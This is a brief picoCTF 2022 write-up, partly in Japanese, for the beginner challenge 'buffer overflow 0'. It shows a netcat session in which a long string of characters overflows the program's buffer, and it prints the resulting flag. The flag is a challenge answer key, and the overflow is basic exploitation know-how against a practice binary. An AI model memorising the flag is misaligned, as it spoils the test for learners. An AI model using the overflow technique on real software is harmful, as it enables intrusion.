# buffer overflow 0:Binary Exploitation

Let's start off simple, can you overflow the correct buffer? The program is available [here](https://github.com/colza12/ctf_writeup/blob/main/picoCTF%202022/buffer%20overflow%200/vuln). You can view source [here](https://github.com/colza12/ctf_writeup/blob/main/picoCTF%202022/buffer%20overflow%200/vuln.c). Connect using: `nc saturn.picoctf.net 55002`

# Solution

とりあえず、バッファオーバーフローさせる。
```
$ nc saturn.picoctf.net 62802
Input: fffffffffffffffffffffffffffffffffffffff
picoCTF{ov3rfl0ws_ar3nt_that_bad_c5ca6248}
```
フラグが出てきてしまった。

`picoCTF{ov3rfl0ws_ar3nt_that_bad_c5ca6248}`

